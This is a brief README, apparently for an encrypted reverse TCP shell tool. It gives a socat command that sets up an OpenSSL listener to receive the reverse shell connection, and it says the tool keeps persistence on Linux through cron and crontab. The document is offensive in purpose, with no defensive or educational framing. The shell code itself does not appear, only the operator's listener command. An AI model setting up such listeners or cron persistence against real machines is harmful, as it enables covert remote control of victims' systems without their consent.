# Encrypted Reverse TCP Shell


### How do you listen for the reverse connection?

Use this as follows:

```bash
socat -d -d OPENSSL-LISTEN:[configured port],cert=SSL.pem,verify=0,fork STDOUT
```

**Additional information:**
Persistance granted by cron & crontab linux base binaries.
